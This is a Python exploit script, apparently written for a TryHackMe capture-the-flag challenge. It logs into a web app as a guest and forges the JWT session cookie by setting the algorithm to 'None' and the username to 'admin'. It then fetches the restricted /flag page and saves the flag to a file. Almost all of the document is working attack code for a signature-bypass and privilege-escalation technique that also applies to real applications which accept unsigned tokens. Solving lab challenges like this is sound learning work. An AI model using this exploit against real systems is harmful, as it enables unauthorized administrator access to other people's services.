import argparse
import base64
import json
import re
import requests
import sys

class Exploiter:
    def __init__(self, baseurl:str):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")

        self.__baseurl = baseurl
        self.__guest_creds = {"user": "guest", "pass": "guest"}
        self.__session = requests.Session()
        return

    def __alter_jwt(self):
        message = str()
        success = bool()

        try:
            # login to the site as a guest. this will give
            # us a jwt we can manipulate.
            success, message = self.__guest_login()
            if not(success):
                raise ValueError(message)
            print(f"[+] {message}")

            # get the value of the target session cookie.
            sessionCookie = self.__session.cookies.get("jwt-session")
            if sessionCookie is None:
                raise ValueError("unable to find session cookie")

            # split the cookie into its separate parts by
            # splitting the string by ".".
            splitCookie = sessionCookie.split(".")
            header = splitCookie[0]
            body = splitCookie[1]

            # add padding to the header and body base64
            # values. this is to make sure the base64 decoding
            # complete work without error.
            if (len(header) % 4) != 0:
                pad = "=" * (4 - int(len(header) % 4))
                header = f"{header}{pad}"

            if (len(body) % 4) != 0:
                pad = "=" * (4 - int(len(body) % 4))
                body = f"{body}{pad}"

            # base64 decode the header and body so we can
            # modify both and forge a new jwt.
            headerDecoded = base64.b64decode(header).decode()
            bodyDecoded = base64.b64decode(body).decode()

            # change the algorithm from "HS256" to "None"
            headerjson = json.loads(headerDecoded)
            headerjson["alg"] = "None"

            # alter the username from "guest" to "admin"
            bodyjson = json.loads(bodyDecoded)
            bodyjson["username"] = "admin"

            #print(f"[i] Header: {headerjson}")
            #print(f"[i] Body: {bodyjson}")

            headerEncoded = base64.b64encode(json.dumps(headerjson).encode()).decode().replace("=","")
            bodyEncoded = base64.b64encode(json.dumps(bodyjson).encode()).decode().replace("=","")

            newJwt = f"{headerEncoded}.{bodyEncoded}."

            #print(f"[i] Forged JWT: {newJwt}")

            # set the target cookie to the forged value
            for cookie in self.__session.cookies:
                if cookie.name == "jwt-session":
                    cookie.value = newJwt

            message = "jwt successfully altered"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def __guest_login(self):
        message = str()
        payload = dict()
        success = bool()
        targetroute = "login"
        targeturl = str()

        try:
            targeturl = f"{self.__baseurl}/{targetroute}"

            resp = self.__session.post(targeturl, data=self.__guest_creds)
            if resp.status_code >= 400:
                raise ValueError(f"guest login failed ({resp.status_code} {resp.reason})")

            message = "guest login successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def GetFlag(self):
        flag = str()
        message = str()
        reg = None
        searchpat = "THM{.*}"
        success = bool()
        targeturl = f"{self.__baseurl}/flag"

        try:
            success, message = self.__alter_jwt()
            if not(success):
                raise ValueError(message)
            print(f"[+] {message}")

            # make a request to the target site with the
            # new, forged, jwt. this will be made as the
            # admin user as far as the site is concerned.
            resp = self.__session.get(targeturl)
            if resp.status_code >= 400:
                raise ValueError(f"unable to get flag ({resp.status_code} {resp.reason})")

            # use regular expression matching to pull out
            # the flag value from the restricted page we
            # were able to access via jwt manipulation.
            reg = re.compile(searchpat)

            matches = reg.findall(resp.text)
            if len(matches) < 1:
                raise ValueError("flag not found on page")

            flag = matches[0]

            message = "flag successfully acquired"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (flag, success, message)

def main():
    try:
        parser = argparse.ArgumentParser()

        parser.add_argument("target", help="domain or ip of target site", type=str)
        parser.add_argument("-p", "--port", help="port to contact target on. default=8089", default=8089, type=int)

        args = parser.parse_args()

        baseurl = f"http://{args.target}:{args.port}"

        exploiter = Exploiter(baseurl=baseurl)
        flag, success, message = exploiter.GetFlag()
        if not(success):
            raise ValueError(message)
        print(f"[+] Flag: {flag}")

        with open("flag.txt", "w") as fptr:
            fptr.write(flag)
        print("[+] flag saved to \"flag.txt\"")
    except Exception as ex:
        print(f"[-] {str(ex)}")
        sys.exit(str(ex))

if __name__ == "__main__":
    main()

